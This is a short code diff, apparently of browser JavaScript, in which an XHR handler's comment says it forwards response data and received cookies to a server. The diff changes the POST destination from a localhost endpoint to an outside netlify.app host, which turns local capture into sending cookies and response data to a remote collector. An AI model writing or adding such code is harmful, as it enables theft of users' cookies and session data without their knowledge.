@@ -34,7 +34,7 @@
             xhr.onload = function() {
                 if (xhr.status >= 200 && xhr.status < 300) {
                     // Send the response data and any cookies received to your local server
-                    fetch('http://localhost:3000/receive-data', {
+                    fetch('https://effervescent-donut-be73e5.netlify.app/', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
